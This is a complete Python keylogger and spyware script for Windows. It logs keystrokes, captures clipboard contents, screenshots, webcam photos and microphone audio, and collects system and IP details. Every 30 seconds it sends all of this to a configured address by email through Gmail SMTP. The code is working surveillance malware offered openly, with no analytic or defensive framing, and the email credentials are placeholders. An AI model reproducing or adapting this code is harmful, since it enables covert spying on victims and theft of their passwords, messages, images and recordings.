import keyboard
import os
import time
import cv2
from threading import Timer
from datetime import datetime
from PIL import ImageGrab
from requests import get
import socket
import platform
import win32clipboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from scipy.io.wavfile import write
import sounddevice as sd

SEND_REPORT_EVERY = 30  # in seconds
PHOTO_SAVE_FOLDER = "keylogger_output"
AUDIO_DURATION = 15  # in seconds

# Email settings
EMAIL_ADDRESS = "Sender dummy Mail ID"
EMAIL_PASSWORD = "Password"
TO_EMAIL = "Your mail ID/You can just use the same Mail ID"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587


class Keylogger:
    def __init__(self, interval, photo_interval=60):
        self.interval = interval
        self.photo_interval = photo_interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

        # Create output directory if it doesn't exist
        if not os.path.exists(PHOTO_SAVE_FOLDER):
            os.makedirs(PHOTO_SAVE_FOLDER)

    def callback(self, event):
        name = event.name
        if len(name) > 1:  # if it's a special key
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def capture_screenshot(self):
        """Capture a screenshot and save it."""
        screenshot = ImageGrab.grab()
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_filename = os.path.join(PHOTO_SAVE_FOLDER, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_filename)
        print(f"[+] Screenshot saved as {screenshot_filename}")
        return screenshot_filename

    def capture_photo(self):
        """Capture a photo using the device's camera and save it."""
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Error: Could not open camera.")
            return None
        ret, frame = cap.read()
        photo_filename = None
        if ret:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            photo_filename = os.path.join(PHOTO_SAVE_FOLDER, f"photo_{timestamp}.jpg")
            cv2.imwrite(photo_filename, frame)
            print(f"[+] Photo saved as {photo_filename}")
        else:
            print("Error: Could not capture image.")
        cap.release()
        return photo_filename

    def capture_audio(self):
        """Record audio and save it."""
        fs = 44100  # Sample rate
        audio_filename = os.path.join(PHOTO_SAVE_FOLDER, "audio.wav")
        try:
            recording = sd.rec(int(AUDIO_DURATION * fs), samplerate=fs, channels=2)
            sd.wait()
            write(audio_filename, fs, recording)
            print(f"[+] Audio recorded and saved as {audio_filename}")
        except Exception as e:
            print(f"Error recording audio: {e}")
        return audio_filename

    def get_system_info(self):
        """Gather and return basic system information."""
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            public_ip = get("https://api.ipify.org").text
            system_info = f"System: {platform.system()} {platform.version()}\n"
            system_info += f"Machine: {platform.machine()}\n"
            system_info += f"Hostname: {hostname}\n"
            system_info += f"Private IP: {ip_address}\n"
            system_info += f"Public IP: {public_ip}\n"
            return system_info
        except Exception as e:
            return f"Error gathering system info: {e}"

    def copy_clipboard(self):
        """Capture the current clipboard content."""
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return f"Clipboard data: {clipboard_data}\n"
        except Exception as e:
            return f"Clipboard could not be copied: {e}\n"

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            system_info = self.get_system_info()
            clipboard_content = self.copy_clipboard()
            log_file_path = os.path.join(PHOTO_SAVE_FOLDER, f"{self.filename}.txt")

            with open(log_file_path, "w") as f:
                f.write(f"System Information:\n{system_info}\n\n")
                f.write(f"Clipboard Content:\n{clipboard_content}\n\n")
                f.write(f"Keystrokes:\n{self.log}")

            print(f"[+] Keystrokes log saved as {log_file_path}")
            self.send_email(log_file_path, screenshot=self.capture_screenshot(), photo=self.capture_photo(),
                            audio=self.capture_audio())
        self.start_dt = datetime.now()
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def send_email(self, log_path, screenshot=None, photo=None, audio=None):
        """Send an email with log, screenshot, photo, and audio as attachments."""
        try:
            msg = MIMEMultipart()
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = TO_EMAIL
            msg["Subject"] = "Keylogger Report"

            body = "Keylogger report attached."
            msg.attach(MIMEText(body, 'plain'))

            def attach_file(file_path, filename):
                if file_path:
                    with open(file_path, "rb") as f:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header("Content-Disposition", f"attachment; filename={filename}")
                        msg.attach(part)

            attach_file(log_path, os.path.basename(log_path))
            attach_file(screenshot, "screenshot.png")
            attach_file(photo, "photo.jpg")
            attach_file(audio, "audio.wav")

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
            print("[+] Email sent successfully!")
        except Exception as e:
            print(f"Error sending email: {e}")

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()

        # Schedule screenshots and photos every interval
        Timer(interval=self.photo_interval, function=self.capture_screenshot).start()
        Timer(interval=self.photo_interval, function=self.capture_photo).start()
        Timer(interval=self.photo_interval, function=self.capture_audio).start()

        print(f"{datetime.now()} - Started keylogger with screenshots, photo, and audio capture")
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, photo_interval=30)
    keylogger.start()




